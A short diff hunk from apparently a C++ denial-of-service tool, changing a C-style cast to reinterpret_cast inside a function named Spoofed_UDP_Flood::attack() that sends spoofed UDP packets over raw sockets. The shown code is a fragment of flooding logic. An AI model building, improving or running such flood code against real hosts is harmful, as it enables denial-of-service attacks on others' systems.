@@ -65,7 +65,7 @@ void Spoofed_UDP_Flood::attack() {
             udp->uh_sum = csum( (unsigned short*) pseudogram , psize);
 
 
-            if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1) {
+            if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, reinterpret_cast<sockaddr*>(&dst), sizeof(struct sockaddr_in)))) == -1) {
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_UDP);
             }else{
